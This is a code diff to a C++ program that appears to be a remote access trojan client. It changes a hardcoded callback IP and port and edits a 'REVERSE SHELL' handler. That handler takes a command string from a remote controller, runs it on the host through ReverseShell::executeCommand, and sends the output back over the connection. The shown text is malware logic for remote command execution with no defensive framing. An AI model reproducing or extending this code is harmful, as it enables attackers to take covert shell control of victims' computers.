@@ -13,7 +13,7 @@
 #include "information/network/NetworkInformation.h"
 #include "reverse_shell/ReverseShell.h"
 
-#define IP "192.168.82.182"
+#define IP "192.168.1.133"
 
 #define PORT 3055
 
@@ -160,12 +160,13 @@ int main() {
                         case 11: {
                             std::cout << "REVERSE SHELL " << std::endl;
                             std::string command = stream.readString();
-                            std::string response = ReverseShell::executeCommand("cd");
+                            std::string response = ReverseShell::executeCommand(L"cd");
                             response.erase(std::remove(response.begin(), response.end(), '\n'), response.cend());
-                            response.append("|"+ReverseShell::executeCommand(command));
-                            std::cout << response << std::endl;
-
+                            response.append("|");
+                            response.append(ReverseShell::executeCommand(Converter::string2wstring(command)));
                             stream.sendString(response.c_str());
+
+                            //stream.sendString(response.c_str());
                             break;
                         }
                         case 16: {
